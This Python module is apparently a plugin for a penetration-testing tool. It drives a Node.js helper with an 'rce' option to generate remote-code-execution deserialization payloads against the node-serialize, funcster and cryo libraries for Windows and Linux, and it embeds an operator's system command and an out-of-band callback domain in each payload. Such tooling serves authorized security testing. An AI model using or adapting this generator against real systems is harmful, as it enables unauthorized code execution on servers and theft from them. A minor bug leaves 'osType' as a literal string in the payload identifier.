
import os
import logging
import urllib.parse
import shutil
from .serializer import Serializer

class DeserNode(Serializer):

    usage = 'Usage: node deser-node.js'

    serializers = [
        {
            'id': 'ns',
            'name': 'node-serialize',
            'description': 'node-serialize',
            'output': 'json',
        },
        {
            'id': 'fstr',
            'name': 'funcster',
            'description': 'funcster',
            'output': 'json',
        },
        {
            'id': 'cryo',
            'name': 'cryo',
            'description': 'cryo',
            'output': 'json',
        }
    ]

    def __init__(self, nodePath, deserNodePath, chainOpts):
        self.nodePath = nodePath
        self.deserNodePath = deserNodePath
        bin = f"'{nodePath}' '{deserNodePath}/deser-node.js' -v rce"
        super().__init__(bin, chainOpts)
        
    def exists(self):
        result = super().exists()
        if not result:
            return False

        if not os.path.isdir(self.deserNodePath):
            logging.error(f"Node-Deser directory {self.deserNodePath} does not exists")
            return False
        
        return True
    
    def payload(self, chainName, chainArgs):
        return super().payload(f"-s {chainName}", chainArgs)
    
    def chains(self):
        return self.serializers
    

    def generate(self, chains):

        if len(chains) == 0:
            return 0

        system_command = self.chainOpts.system_command
        interact_domain = self.chainOpts.interact_domain
    
        logging.info(f"Interact domain: {interact_domain}")
        logging.info(f"System command: {system_command}")

        logging.info(f"Generating payloads...")
        count = 0
        for chain in chains:

            if self.chainOpts.format != None and self.chainOpts.format != chain['output']:
                logging.debug(f"[{chain['name']}] Skipping chain of format '{chain['output']}'")
                continue
            
            for osType in ['windows', 'linux']:

                logging.info(f"[{chain['name']}] Generating payload '{chain['name']}' for os type {osType}")

                chainUniqueId = f"{chain['id']}-osType"

                chain_system_command = system_command
                chain_system_command = chain_system_command.replace('%%chain_id%%', chain['id'])
                chain_system_command = chain_system_command.replace('%%domain%%', str(interact_domain))
                chain_system_command = chain_system_command.replace("'", "\\'")

                chainArguments = f"-c '{chain_system_command}' -t {osType}"
                
                result = self.payload(chain['id'], chainArguments)
                if result.returncode != 0:
                    logging.error(f"[{chain['name']}] Failed to create payload")
                    if result.stderr != b'':
                        logging.error(result.stderr.decode('ascii'))
                    if result.stdout != b'':
                        logging.error(result.stdout.decode('ascii'))
                    continue

                payload = result.stdout

                for line in reversed(payload.split(b'\n')):
                    if line.strip() != b'':
                        payload = line
                        break
                
                logging.debug(f"[{chain['name']}] Payload generated with {len(payload)} bytes")

                payload = self.encode(payload)

                self.output(chainUniqueId, payload+b"\n")

                count = count + 1    
                
                
        return count